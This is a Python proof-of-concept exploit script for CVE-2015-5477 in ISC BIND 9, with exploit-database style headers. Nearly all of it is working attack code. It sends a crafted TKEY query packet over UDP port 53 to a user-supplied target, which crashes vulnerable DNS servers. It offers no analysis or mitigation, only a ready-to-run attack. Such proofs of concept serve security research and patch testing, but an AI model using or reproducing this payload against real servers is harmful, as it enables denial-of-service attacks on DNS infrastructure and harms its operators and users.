# Exploit Author: elceef
# Software Link: https://github.com/elceef/tkeypoc/
# Version: ISC BIND 9
# Tested on: multiple
# CVE : CVE-2015-5477
 
#!/usr/bin/env python
 
import socket
import sys
 
print(&#039;CVE-2015-5477 BIND9 TKEY PoC&#039;)
 
if len(sys.argv) < 2:
    print(&#039;Usage: &#039; + sys.argv[0] + &#039; [target]&#039;)
    sys.exit(1)
 
print(&#039;Sending packet to &#039; + sys.argv[1] + &#039; ...&#039;)
 
payload = bytearray(&#039;4d 55 01 00 00 01 00 00 00 00 00 01 03 41 41 41 03 41 41 41 00 00 f9 00 ff 03 41 41 41 03 41 41 41 00 00 0a 00 ff 00 00 00 00 00 09 08 41 41 41 41 41 41 41 41&#039;.replace(&#039; &#039;, &#039;&#039;).decode(&#039;hex&#039;)) 
 
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.sendto(payload, (sys.argv[1], 53))
 
print(&#039;Done.&#039;)

